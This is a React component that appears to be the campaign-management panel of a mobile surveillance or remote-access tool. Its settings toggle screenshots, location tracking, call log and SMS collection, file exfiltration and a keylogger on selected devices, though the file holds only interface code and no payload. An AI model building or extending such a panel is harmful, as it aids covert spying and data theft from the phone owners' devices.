'use client';

import React, { useState, useEffect } from 'react';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Switch } from '@/components/ui/switch';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { useToast } from '@/hooks/use-toast';
import { apiClient } from '@/lib/api-client';
import { Campaign, CampaignSettings, Device } from '@/lib/types';
import {
  Plus,
  Settings,
  Users,
  Play,
  Pause,
  Trash2,
  Edit,
  CheckCircle,
  XCircle,
  Clock
} from 'lucide-react';

interface CampaignManagerProps {
  devices: Device[];
  selectedCampaign?: string;
  onCampaignSelect: (campaignId: string | null) => void;
}

const defaultSettings: CampaignSettings = {
  autoScreenshots: false,
  locationTracking: false,
  callLogCollection: true,
  smsCollection: true,
  fileExfiltration: false,
  keylogger: false,
  screenshotInterval: 30,
  locationInterval: 15,
};

export function CampaignManager({ devices, selectedCampaign, onCampaignSelect }: CampaignManagerProps) {
  const [campaigns, setCampaigns] = useState<Campaign[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [showCreateDialog, setShowCreateDialog] = useState(false);
  const [showEditDialog, setShowEditDialog] = useState(false);
  const [editingCampaign, setEditingCampaign] = useState<Campaign | null>(null);
  const [formData, setFormData] = useState({
    name: '',
    description: '',
    selectedDevices: [] as string[],
    settings: { ...defaultSettings },
  });
  const { toast } = useToast();

  useEffect(() => {
    loadCampaigns();
  }, []);

  const loadCampaigns = async () => {
    setIsLoading(true);
    try {
      const response = await apiClient.getCampaigns();
      if (response.success && response.data) {
        setCampaigns(response.data);
      } else {
        toast({
          variant: 'destructive',
          title: 'Error',
          description: response.error || 'Failed to load campaigns',
        });
      }
    } catch (error) {
      toast({
        variant: 'destructive',
        title: 'Error',
        description: 'Failed to load campaigns',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleCreateCampaign = async () => {
    if (!formData.name.trim()) {
      toast({
        variant: 'destructive',
        title: 'Error',
        description: 'Campaign name is required',
      });
      return;
    }

    try {
      const response = await apiClient.createCampaign({
        name: formData.name,
        description: formData.description,
        status: 'active',
        devices: formData.selectedDevices,
        settings: formData.settings,
      });

      if (response.success && response.data) {
        setCampaigns([...campaigns, response.data]);
        setShowCreateDialog(false);
        resetForm();
        toast({
          title: 'Success',
          description: 'Campaign created successfully',
        });
      } else {
        toast({
          variant: 'destructive',
          title: 'Error',
          description: response.error || 'Failed to create campaign',
        });
      }
    } catch (error) {
      toast({
        variant: 'destructive',
        title: 'Error',
        description: 'Failed to create campaign',
      });
    }
  };

  const handleUpdateCampaign = async () => {
    if (!editingCampaign) return;

    try {
      const response = await apiClient.updateCampaign(editingCampaign.id, {
        name: formData.name,
        description: formData.description,
        devices: formData.selectedDevices,
        settings: formData.settings,
      });

      if (response.success && response.data) {
        setCampaigns(campaigns.map(c => c.id === editingCampaign.id ? response.data! : c));
        setShowEditDialog(false);
        setEditingCampaign(null);
        resetForm();
        toast({
          title: 'Success',
          description: 'Campaign updated successfully',
        });
      } else {
        toast({
          variant: 'destructive',
          title: 'Error',
          description: response.error || 'Failed to update campaign',
        });
      }
    } catch (error) {
      toast({
        variant: 'destructive',
        title: 'Error',
        description: 'Failed to update campaign',
      });
    }
  };

  const handleDeleteCampaign = async (campaignId: string) => {
    try {
      const response = await apiClient.deleteCampaign(campaignId);
      if (response.success) {
        setCampaigns(campaigns.filter(c => c.id !== campaignId));
        if (selectedCampaign === campaignId) {
          onCampaignSelect(null);
        }
        toast({
          title: 'Success',
          description: 'Campaign deleted successfully',
        });
      } else {
        toast({
          variant: 'destructive',
          title: 'Error',
          description: response.error || 'Failed to delete campaign',
        });
      }
    } catch (error) {
      toast({
        variant: 'destructive',
        title: 'Error',
        description: 'Failed to delete campaign',
      });
    }
  };

  const handleToggleCampaignStatus = async (campaign: Campaign) => {
    const newStatus = campaign.status === 'active' ? 'paused' : 'active';

    try {
      const response = await apiClient.updateCampaign(campaign.id, { status: newStatus });
      if (response.success && response.data) {
        setCampaigns(campaigns.map(c => c.id === campaign.id ? response.data! : c));
        toast({
          title: 'Success',
          description: `Campaign ${newStatus === 'active' ? 'activated' : 'paused'}`,
        });
      }
    } catch (error) {
      toast({
        variant: 'destructive',
        title: 'Error',
        description: 'Failed to update campaign status',
      });
    }
  };

  const openEditDialog = (campaign: Campaign) => {
    setEditingCampaign(campaign);
    setFormData({
      name: campaign.name,
      description: campaign.description,
      selectedDevices: campaign.devices,
      settings: campaign.settings,
    });
    setShowEditDialog(true);
  };

  const resetForm = () => {
    setFormData({
      name: '',
      description: '',
      selectedDevices: [],
      settings: { ...defaultSettings },
    });
  };

  const getStatusIcon = (status: Campaign['status']) => {
    switch (status) {
      case 'active':
        return <CheckCircle className="h-4 w-4 text-green-500" />;
      case 'paused':
        return <Pause className="h-4 w-4 text-yellow-500" />;
      case 'completed':
        return <XCircle className="h-4 w-4 text-gray-500" />;
      default:
        return <Clock className="h-4 w-4 text-blue-500" />;
    }
  };

  const getStatusColor = (status: Campaign['status']) => {
    switch (status) {
      case 'active':
        return 'bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200';
      case 'paused':
        return 'bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-200';
      case 'completed':
        return 'bg-gray-100 text-gray-800 dark:bg-gray-900 dark:text-gray-200';
      default:
        return 'bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-200';
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <h2 className="text-2xl font-bold">Campaign Management</h2>
        <Dialog open={showCreateDialog} onOpenChange={setShowCreateDialog}>
          <DialogTrigger asChild>
            <Button onClick={() => setShowCreateDialog(true)}>
              <Plus className="mr-2 h-4 w-4" />
              Create Campaign
            </Button>
          </DialogTrigger>
          <DialogContent className="max-w-2xl">
            <DialogHeader>
              <DialogTitle>Create New Campaign</DialogTitle>
              <DialogDescription>
                Set up a new campaign to organize and manage your devices.
              </DialogDescription>
            </DialogHeader>

            <div className="space-y-4">
              <div>
                <Label htmlFor="name">Campaign Name</Label>
                <Input
                  id="name"
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  placeholder="Enter campaign name"
                />
              </div>

              <div>
                <Label htmlFor="description">Description</Label>
                <Textarea
                  id="description"
                  value={formData.description}
                  onChange={(e) => setFormData({ ...formData, description: e.target.value })}
                  placeholder="Enter campaign description"
                />
              </div>

              <div>
                <Label>Select Devices</Label>
                <div className="grid grid-cols-2 gap-2 mt-2">
                  {devices.map((device) => (
                    <label key={device.guid} className="flex items-center space-x-2">
                      <input
                        type="checkbox"
                        checked={formData.selectedDevices.includes(device.guid)}
                        onChange={(e) => {
                          if (e.target.checked) {
                            setFormData({
                              ...formData,
                              selectedDevices: [...formData.selectedDevices, device.guid],
                            });
                          } else {
                            setFormData({
                              ...formData,
                              selectedDevices: formData.selectedDevices.filter(id => id !== device.guid),
                            });
                          }
                        }}
                      />
                      <span className="text-sm">{device.name}</span>
                    </label>
                  ))}
                </div>
              </div>

              <Separator />

              <div>
                <Label className="text-base font-semibold">Campaign Settings</Label>
                <div className="grid grid-cols-2 gap-4 mt-3">
                  <div className="flex items-center justify-between">
                    <Label htmlFor="screenshots">Auto Screenshots</Label>
                    <Switch
                      id="screenshots"
                      checked={formData.settings.autoScreenshots}
                      onCheckedChange={(checked) =>
                        setFormData({
                          ...formData,
                          settings: { ...formData.settings, autoScreenshots: checked },
                        })
                      }
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label htmlFor="location">Location Tracking</Label>
                    <Switch
                      id="location"
                      checked={formData.settings.locationTracking}
                      onCheckedChange={(checked) =>
                        setFormData({
                          ...formData,
                          settings: { ...formData.settings, locationTracking: checked },
                        })
                      }
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label htmlFor="calls">Call Log Collection</Label>
                    <Switch
                      id="calls"
                      checked={formData.settings.callLogCollection}
                      onCheckedChange={(checked) =>
                        setFormData({
                          ...formData,
                          settings: { ...formData.settings, callLogCollection: checked },
                        })
                      }
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label htmlFor="sms">SMS Collection</Label>
                    <Switch
                      id="sms"
                      checked={formData.settings.smsCollection}
                      onCheckedChange={(checked) =>
                        setFormData({
                          ...formData,
                          settings: { ...formData.settings, smsCollection: checked },
                        })
                      }
                    />
                  </div>
                </div>

                {formData.settings.autoScreenshots && (
                  <div className="mt-3">
                    <Label htmlFor="screenshot-interval">Screenshot Interval (minutes)</Label>
                    <Input
                      id="screenshot-interval"
                      type="number"
                      value={formData.settings.screenshotInterval}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          settings: {
                            ...formData.settings,
                            screenshotInterval: parseInt(e.target.value) || 30,
                          },
                        })
                      }
                      min="1"
                      max="1440"
                    />
                  </div>
                )}

                {formData.settings.locationTracking && (
                  <div className="mt-3">
                    <Label htmlFor="location-interval">Location Update Interval (minutes)</Label>
                    <Input
                      id="location-interval"
                      type="number"
                      value={formData.settings.locationInterval}
                      onChange={(e) =>
                        setFormData({
                          ...formData,
                          settings: {
                            ...formData.settings,
                            locationInterval: parseInt(e.target.value) || 15,
                          },
                        })
                      }
                      min="1"
                      max="1440"
                    />
                  </div>
                )}
              </div>
            </div>

            <DialogFooter>
              <Button variant="outline" onClick={() => setShowCreateDialog(false)}>
                Cancel
              </Button>
              <Button onClick={handleCreateCampaign}>Create Campaign</Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>

      {isLoading ? (
        <div className="flex items-center justify-center py-8">
          <div className="text-center">Loading campaigns...</div>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {campaigns.map((campaign) => (
            <Card
              key={campaign.id}
              className={`cursor-pointer transition-all ${
                selectedCampaign === campaign.id ? 'ring-2 ring-primary' : 'hover:shadow-md'
              }`}
              onClick={() => onCampaignSelect(campaign.id)}
            >
              <CardHeader className="pb-3">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-lg">{campaign.name}</CardTitle>
                  <Badge className={getStatusColor(campaign.status)}>
                    <div className="flex items-center space-x-1">
                      {getStatusIcon(campaign.status)}
                      <span>{campaign.status}</span>
                    </div>
                  </Badge>
                </div>
                <CardDescription>{campaign.description}</CardDescription>
              </CardHeader>

              <CardContent>
                <div className="space-y-2">
                  <div className="flex items-center justify-between text-sm">
                    <span className="flex items-center">
                      <Users className="mr-1 h-4 w-4" />
                      Devices
                    </span>
                    <span>{campaign.devices.length}</span>
                  </div>

                  <div className="flex items-center justify-between text-sm">
                    <span>Created</span>
                    <span>{new Date(campaign.createdAt).toLocaleDateString()}</span>
                  </div>
                </div>

                <Separator className="my-3" />

                <div className="flex items-center justify-between">
                  <div className="flex space-x-1">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={(e) => {
                        e.stopPropagation();
                        openEditDialog(campaign);
                      }}
                    >
                      <Edit className="h-3 w-3" />
                    </Button>

                    <Button
                      variant="outline"
                      size="sm"
                      onClick={(e) => {
                        e.stopPropagation();
                        handleToggleCampaignStatus(campaign);
                      }}
                    >
                      {campaign.status === 'active' ? (
                        <Pause className="h-3 w-3" />
                      ) : (
                        <Play className="h-3 w-3" />
                      )}
                    </Button>

                    <Button
                      variant="outline"
                      size="sm"
                      onClick={(e) => {
                        e.stopPropagation();
                        handleDeleteCampaign(campaign.id);
                      }}
                    >
                      <Trash2 className="h-3 w-3" />
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      )}

      {}
      <Dialog open={showEditDialog} onOpenChange={setShowEditDialog}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle>Edit Campaign</DialogTitle>
            <DialogDescription>
              Update campaign settings and configuration.
            </DialogDescription>
          </DialogHeader>

          {}
          <div className="space-y-4">
            <div>
              <Label htmlFor="edit-name">Campaign Name</Label>
              <Input
                id="edit-name"
                value={formData.name}
                onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                placeholder="Enter campaign name"
              />
            </div>

            <div>
              <Label htmlFor="edit-description">Description</Label>
              <Textarea
                id="edit-description"
                value={formData.description}
                onChange={(e) => setFormData({ ...formData, description: e.target.value })}
                placeholder="Enter campaign description"
              />
            </div>

            {}
          </div>

          <DialogFooter>
            <Button variant="outline" onClick={() => setShowEditDialog(false)}>
              Cancel
            </Button>
            <Button onClick={handleUpdateCampaign}>Update Campaign</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}